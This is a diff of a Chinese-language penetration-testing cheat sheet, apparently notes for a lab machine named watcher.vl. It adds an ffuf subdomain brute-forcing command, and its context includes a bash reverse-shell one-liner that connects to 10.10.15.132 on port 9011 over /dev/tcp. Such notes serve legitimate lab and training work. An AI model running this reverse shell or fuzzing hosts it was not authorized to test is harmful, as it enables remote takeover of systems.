@@ -15,6 +15,10 @@ SQLite:	  db.sqlite3, database.db
 JSON存储	: db.json, users.json, data.json
 YAML:     config.yaml
 ```
+#### 子域名爆破
+```
+[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991
+```
 #### 反弹
 ```
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1'
